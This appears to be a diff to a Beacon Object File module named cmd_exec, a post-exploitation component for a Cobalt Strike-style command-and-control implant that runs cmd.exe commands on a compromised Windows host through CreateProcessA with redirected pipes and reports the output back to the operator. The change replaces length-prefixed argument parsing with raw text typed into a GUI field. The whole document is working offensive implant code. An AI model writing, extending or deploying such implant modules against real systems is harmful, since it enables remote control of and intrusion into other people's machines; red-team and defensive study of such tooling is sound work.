@@ -3,9 +3,9 @@
  *
  * Runs a cmd.exe command and returns its stdout/stderr.
  *
- *   args (CS packed): one BeaconDataExtract string = the command line, e.g.
- *   "whoami", "ipconfig /all", "dir C:\\Windows". Build the arg buffer:
- *     [4-byte BE length][command bytes]
+ *   args: the command line as plain text (no CS length-prefix), e.g.
+ *   "whoami", "ipconfig /all", "dir C:\\Windows". Type it directly in the
+ *   GUI's text-args field — no .bin file needed.
  *
  * Uses CreateProcessA with a redirected pipe (no window), reads the child's
  * output, and prints it back via BeaconPrintf(CALLBACK_OUTPUT, "%s", ...).
@@ -37,8 +37,6 @@ DECLSPEC_IMPORT int __cdecl MSVCRT$_snprintf(char *, size_t, const char *, ...);
 #define BUF_SIZE 65536
 
 void go(char *args, int alen) {
-    datap parser;
-    char *cmd = NULL;
     char *buf = NULL;   /* heap-allocated output buffer (avoid a 64KB stack frame) */
     DWORD total = 0;
     SECURITY_ATTRIBUTES sa;
@@ -46,10 +44,23 @@ void go(char *args, int alen) {
     STARTUPINFOA si;
     PROCESS_INFORMATION pi;
     char cmdline[1024];
-
-    BeaconDataParse(&parser, args, alen);
-    cmd = BeaconDataExtract(&parser, NULL);
-    if (!cmd || !cmd[0]) {
+    /* The command is the raw args buffer as text (no CS length-prefix). Copy
+     * alen bytes into a NUL-terminated buffer so CreateProcessA gets a clean
+     * C string. Cap at the cmdline buffer size. */
+    char cmd[512];
+    int clen = alen < (int)sizeof(cmd) - 1 ? alen : (int)sizeof(cmd) - 1;
+    if (clen <= 0) {
+        BeaconPrintf(CALLBACK_ERROR, "cmd_exec: no command specified");
+        return;
+    }
+    /* copy + NUL-terminate */
+    for (int i = 0; i < clen; i++) cmd[i] = args[i];
+    cmd[clen] = 0;
+    /* strip a trailing newline if the GUI/source added one */
+    while (clen > 0 && (cmd[clen - 1] == '\n' || cmd[clen - 1] == '\r')) {
+        cmd[--clen] = 0;
+    }
+    if (clen == 0) {
         BeaconPrintf(CALLBACK_ERROR, "cmd_exec: no command specified");
         return;
     }
